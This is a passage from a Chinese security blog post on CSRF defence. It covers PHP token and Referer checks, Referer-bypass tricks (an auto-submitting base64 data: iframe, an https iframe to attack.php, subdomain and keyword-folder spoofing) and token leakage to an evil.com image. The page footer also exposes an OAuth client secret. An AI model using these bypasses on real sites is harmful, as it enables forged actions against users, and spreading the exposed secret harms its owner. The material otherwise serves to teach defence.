+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    session_start();</span><br><span class="line">    $user_token = $_POST[&quot;user_token&quot;];</span><br><span class="line">    if($_SESSION[&quot;user_token&quot;] == $user_token)</span><br><span class="line">    &#123;</span><br><span class="line">        echo $_SESSION[&quot;user_token&quot;];</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        echo &quot;$user_token&quot;;</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        echo &quot;successful&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;fail&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="四、Referer防御机制"><a href="#四、Referer防御机制" class="headerlink" title="四、Referer防御机制"></a>四、Referer防御机制</h1><h2 id="0x01-Referer防御CSRF原理"><a href="#0x01-Referer防御CSRF原理" class="headerlink" title="0x01 Referer防御CSRF原理"></a>0x01 Referer防御CSRF原理</h2><p>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基于此可以获得一些信息用于处理<br>当用户点击被构造好的CSRF利用页面，那么在执行用户对应操作时，提交的HTTP请求中就有对应的Referer值，此时服务端判断Referer值是否与服务器的域名信息有关，如果不相关则不执行操作</p>
+<h2 id="0x02-使用Referer进行CSRF防御"><a href="#0x02-使用Referer进行CSRF防御" class="headerlink" title="0x02 使用Referer进行CSRF防御"></a>0x02 使用Referer进行CSRF防御</h2><p>在PHP中使用<code>$_SERVER[&#39;HTTP_REFERER&#39;]</code>获取页面提交请求中的Referer值<br>这里需要用到一个strpos函数，用法参考 <span class="exturl" data-url="aHR0cHM6Ly93d3cudzNzY2hvb2wuY29tLmNuL3BocC9mdW5jX3N0cmluZ19zdHJwb3MuYXNw">PHP strpos() 函数-w3c<i class="fa fa-external-link-alt"></i></span><br>附上防御代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$referer = $_SERVER[&quot;HTTP_REFERER&quot;];</span><br><span class="line">	if(strpos($referer,&quot;192.168.150.1&quot;) !== false)</span><br><span class="line">	&#123;</span><br><span class="line">		echo $_SERVER[&quot;HTTP_REFERER&quot;];</span><br><span class="line">		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo &quot;successful&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		echo $_SERVER[&quot;HTTP_REFERER&quot;];</span><br><span class="line">		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo &quot;fail&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>strpos函数里面的意思也就是在获取的Referer值里面是否包含192.168.150.1这个域名，如果包含了说明是正确的，没包含就可能是恶意的</p>
+<h2 id="0x03-Referer-绕过"><a href="#0x03-Referer-绕过" class="headerlink" title="0x03 Referer 绕过"></a>0x03 Referer 绕过</h2><h3 id="1-Refere为空条件下"><a href="#1-Refere为空条件下" class="headerlink" title="1.Refere为空条件下"></a>1.Refere为空条件下</h3><p>利用ftp://，http://，https://，file://，javascript:，data:，比如这个时候浏览器地址栏是 file:// 开头的，这个HTML页面向任何http站点提交请求的话，这些请求的Referer都是空的。<br>例：<br>① 利用<code>data:</code>协议</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">	    &lt;iframe src=&quot;data:text/html;base64,PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg==&quot;&gt;</span><br><span class="line">	&lt;/body&gt; </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>② 利用<code>https</code>协议<br>    https向http跳转的时候Referer为空<br>    拿一个https的webshell<br>    <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;https://www.xxxx.com/attack.php&quot;&gt;</span><br></pre></td></tr></table></figure><br>    attack.php写上CSRF攻击代码</p>
+<h3 id="2-判断Referer是某域情况下绕过"><a href="#2-判断Referer是某域情况下绕过" class="headerlink" title="2.判断Referer是某域情况下绕过"></a>2.判断Referer是某域情况下绕过</h3><p>比如你找的csrf是 <code>xxx.com</code>，验证的referer是验证的 <code>*.xx.com</code>，可以找个二级域名之后 <code>&lt;img &quot;csrf地址&quot;&gt;</code> 之后在把地址发出去就可以伪造。</p>
+<h3 id="3-判断Referer是否存在某关键词"><a href="#3-判断Referer是否存在某关键词" class="headerlink" title="3.判断Referer是否存在某关键词"></a>3.判断Referer是否存在某关键词</h3><p>Referer判断存在不存在<code>google.com</code>这个关键词，在网站新建一个<code>google.com</code>文件夹，把CSRF PoC存放在<code>google.com</code>目录，即可绕过。</p>
+<h3 id="4-判断referer是否有某域名"><a href="#4-判断referer是否有某域名" class="headerlink" title="4.判断referer是否有某域名"></a>4.判断referer是否有某域名</h3><p>判断了Referer开头是否以<code>126.com</code>以及126子域名  不验证根域名为 <code>126.com</code> 那么我这里可以构造子域名 <code>x.126.com.xxx.com</code> 作为蠕虫传播的载体服务器，即可绕过。</p>
+<h1 id="五、CSRF漏洞防御总结"><a href="#五、CSRF漏洞防御总结" class="headerlink" title="五、CSRF漏洞防御总结"></a>五、CSRF漏洞防御总结</h1><h2 id="0x01-验证码"><a href="#0x01-验证码" class="headerlink" title="0x01 验证码"></a>0x01 验证码</h2><p>验证码防御被认为是对抗CSRF最为简单而且有效的防御方法。<br>CSRF在用户不知情的情况下完成对应操作，而验证码强制用户与应用程序交互，才能最终完成操作。通常情况下，验证码能够很好的遏制CSRF。<br>但出于用户体验考虑，不可能每一个操作都加入验证码，所以验证码只作为辅助手段，不能作为防御CSRF的主要解决方案。</p>
+<ul>
+<li>验证码防御也可以被认为是二次验证</li>
+</ul>
+<h2 id="0x02-Referer-Check"><a href="#0x02-Referer-Check" class="headerlink" title="0x02 Referer Check"></a>0x02 Referer Check</h2><p>Referer Check主要用于防止盗链。同理也可以用来检查请求是否来自合法的“源”。<br>比如用户修改密码，一定是在登录系统后台之后进行操作，所以在修改提交表单的时候，一定会从系统后台页面提交，携带Referer头，如果Referer不是当前系统的域，那么极有可能遭受CSRF。</p>
+<p>缺陷：服务器并非任何时候都可以取到Referer。例如HTTPS跳转到HTTP。</p>
+<h2 id="0x03-Anti-CSRF-Token"><a href="#0x03-Anti-CSRF-Token" class="headerlink" title="0x03 Anti CSRF Token"></a>0x03 Anti CSRF Token</h2><p>CSRF本质原因：重要操作的所有参数都是被恶意攻击者猜测到的。<br>那么防御措施就是生成一个随机且不被轻易猜测的参数，目前大多数防御都采用不可预测的token值。</p>
+<p>缺陷：Token泄露<br>1.GET型Token泄露<br>页面包含 <code>&lt;img src=&quot;http://www.evil.com/&quot;/&gt;</code> 那么请求中的Referer就会携带对应的GET Token。</p>
+<p>2.POST型Token泄露<br>利用XSS漏洞获取其Cookie，查看存储在其中的Token值。</p>
+
+    </div>
+
+    
+    
+    
+      
+
+
+    <footer class="post-footer">
+<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------　　　　本文结束　<i class="fa fa-flag"></i>　感谢阅读　　　　-------------</div>
+    
+</div>
+
+
+<div style="text-align: center"><span id="jrsc" >正在加载今日诗词....</span></div>
+
+          <div class="post-tags">
+              <a href="/tags/CSRF/" rel="tag"><i class="fa fa-tag"></i> CSRF</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/archives/60505.html" rel="prev" title="kali安装Docker并配置Vulhub">
+                  <i class="fa fa-chevron-left"></i> kali安装Docker并配置Vulhub
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments gitalk-container"></div><script src="/js/comments.js"></script>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">z0sen</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">27k</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+<link rel="stylesheet" href="//cdn.bootcdn.net/ajax/libs/gitalk/1.7.2/gitalk.css">
+
+<script class="next-config" data-name="gitalk" type="application/json">{&quot;enable&quot;:true,&quot;github_id&quot;:&quot;z0sen&quot;,&quot;repo&quot;:&quot;z0sen.github.io&quot;,&quot;client_id&quot;:&quot;3d51393b98f882e3e640&quot;,&quot;client_secret&quot;:&quot;4cfd4a1d87c61ec41d9e663be6ac52fe891ee1c4&quot;,&quot;admin_user&quot;:&quot;z0sen&quot;,&quot;distraction_free_mode&quot;:true,&quot;proxy&quot;:&quot;https:&#x2F;&#x2F;cors-anywhere.herokuapp.com&#x2F;https:&#x2F;&#x2F;github.com&#x2F;login&#x2F;oauth&#x2F;access_token&quot;,&quot;language&quot;:&quot;zh-CN&quot;,&quot;js&quot;:&quot;&#x2F;&#x2F;cdn.bootcdn.net&#x2F;ajax&#x2F;libs&#x2F;gitalk&#x2F;1.7.2&#x2F;gitalk.js&quot;,&quot;path_md5&quot;:&quot;05100f12f28b883ead7b410283410c74&quot;}</script>
+<script src="/js/third-party/comments/gitalk.js"></script>
+<script src="//sdk.jinrishici.com/v2/browser/jinrishici.js"></script>
+<script>
+  console.log('今日诗词 - 开始加载...');
+  jinrishici.load((result) => {
+    let jrsc = document.getElementById('jrsc');
+    if (jrsc) {
+      console.log('今日诗词 - 标签获取成功.');
+    } else {
+      console.log('今日诗词 - 标签获取失败!');
+      return;
+    }
+    const data = result.data;
+    let author = data.origin.author;
+    let title = '《' + data.origin.title + '》';
+    let content = data.content.substr(0, data.content.length - 1);
+    let dynasty = data.origin.dynasty.substr(0, data.origin.dynasty.length - 1);
+    jrsc.innerText = content + ' @ ' + dynasty + '·' + author + title;
+    console.log('今日诗词 - 载入完毕.');
+    if (data.origin.author == '李白') {
+      let audio = document.createElement("audio");
+      audio.src = "/ding.mp3";
+      audio.play();
+    }
+  });
+</script><div class="moon-menu">
+  <div class="moon-menu-items">
+    
+    <div id="moon-menu-item-back2bottom" class="moon-menu-item" onclick="back2bottom()">
+      <i class='fa fa-chevron-down'></i>    </div>
+    
+    <div id="moon-menu-item-back2top" class="moon-menu-item" onclick="back2top()">
+      <i class='fa fa-chevron-up'></i>    </div>
+    
+  </div>
+  <div class="moon-menu-button">
+    <svg class="moon-menu-bg">
+      <circle class="moon-menu-cricle" cx="50%" cy="50%" r="44%"></circle>
+      <circle class="moon-menu-border" cx="50%" cy="50%" r="48%"></circle>
+    </svg>
+    <div class="moon-menu-content">
+      <div class="moon-menu-icon"><i class='fas fa-ellipsis-v'></i></div>
+      <div class="moon-menu-text"></div>
+    </div>
+  </div>
+</div><script src="/js/injector.js"></script>
+</body>
+</html>
